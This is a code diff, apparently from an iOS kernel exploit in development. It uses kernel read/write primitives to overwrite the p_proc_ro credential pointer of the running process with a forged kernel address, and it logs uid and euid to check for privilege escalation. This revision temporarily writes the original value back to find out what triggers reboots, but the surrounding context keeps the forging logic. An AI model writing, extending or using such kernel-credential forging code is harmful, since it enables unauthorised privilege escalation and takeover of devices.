@@ -4498,32 +4498,31 @@ e10fail:
     //    дословный raw qword — сохранён выше для restore.
     kpNote(r, [NSString stringWithFormat:@"  подмена: p_proc_ro @ 0x%016llx ← 0x%016llx (форж; оригинал raw=0x%016llx сохранён)",
               (unsigned long long)procRoSlot, (unsigned long long)forgeKVA, (unsigned long long)origProcRoRaw]);
-    // Snapshot proc head (p_list @+0) — 0x20 block RMW must not smash it.
-    uint64_t list0 = 0, list1 = 0;
-    (void)kpRead(selfProc + 0x0, &list0, 8, "proc+0", r);
-    (void)kpRead(selfProc + 0x8, &list1, 8, "proc+8", r);
-    kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] before swap list0=%#llx list1=%#llx",
-              (unsigned long long)list0, (unsigned long long)list1]);
+    // 2.0.149: IDENTITY WRITE only — same qword back into p_proc_ro. Survives =
+    // write path OK; dies = early_kwrite/zone_write to proc is the reboot source.
     {
-        krw_zone_verdict zv = krw_zone_write_qword(procRoSlot, forgeKVA, selfProc, 0x1000);
-        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] zone_write(swap)=%d", (int)zv]);
+        uint64_t list0 = 0, list1 = 0;
+        (void)kpRead(selfProc + 0x0, &list0, 8, "proc+0", r);
+        (void)kpRead(selfProc + 0x8, &list1, 8, "proc+8", r);
+        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] identity write orig=%#llx list0=%#llx list1=%#llx",
+                  (unsigned long long)origProcRoRaw, (unsigned long long)list0, (unsigned long long)list1]);
+        krw_zone_verdict zv = krw_zone_write_qword(procRoSlot, origProcRoRaw, selfProc, 0x1000);
+        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] zone_write(identity)=%d", (int)zv]);
         if (zv != KRW_ZONE_OK) {
-            [r appendFormat:@"FAIL: zone_write(swap)=%d — не пишем\n", (int)zv];
+            [r appendFormat:@"FAIL: zone_write(identity)=%d\n", (int)zv];
             return r;
         }
-    }
-    didSwap = YES;
-    rbRaw = 0;
-    kpRead(procRoSlot, &rbRaw, sizeof(rbRaw), "p_proc_ro readback", r);
-    kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] swap readback=%#llx expect=%#llx",
-              (unsigned long long)rbRaw, (unsigned long long)forgeKVA]);
-    {
-        uint64_t l0b = 0, l1b = 0;
-        (void)kpRead(selfProc + 0x0, &l0b, 8, "proc+0 after", r);
-        (void)kpRead(selfProc + 0x8, &l1b, 8, "proc+8 after", r);
-        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] after swap list0=%#llx list1=%#llx (delta=%@)",
-                  (unsigned long long)l0b, (unsigned long long)l1b,
-                  (l0b == list0 && l1b == list1) ? @"нет" : @"ЕСТЬ — RMW порвал p_list!"]);
+        uint64_t rbId = 0, l0a = 0, l1a = 0;
+        (void)kpRead(procRoSlot, &rbId, 8, "identity readback", r);
+        (void)kpRead(selfProc + 0x0, &l0a, 8, "proc+0 after", r);
+        (void)kpRead(selfProc + 0x8, &l1a, 8, "proc+8 after", r);
+        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] identity rb=%#llx list0=%#llx list1=%#llx (list delta=%@)",
+                  (unsigned long long)rbId, (unsigned long long)l0a, (unsigned long long)l1a,
+                  (l0a == list0 && l1a == list1) ? @"нет" : @"ЕСТЬ"]);
+        [r appendString:@"\n=== E11 IDENTITY-WRITE OK — swap НЕ выполнялся (2.0.149) ===\n"];
+        [r appendFormat:@"\n[VERIFY] GETUID=%d GETEUID=%d E11_RESTORE_MATCH=1 P1=0 P2=0 P3=0 SWAP=0 IDENTITY=1\n",
+         (int)getuid(), (int)geteuid()];
+        return r;
     }
     kpNote(r, [NSString stringWithFormat:@"  readback после подмены: 0x%016llx (ждём 0x%016llx)",
               (unsigned long long)rbRaw, (unsigned long long)forgeKVA]);
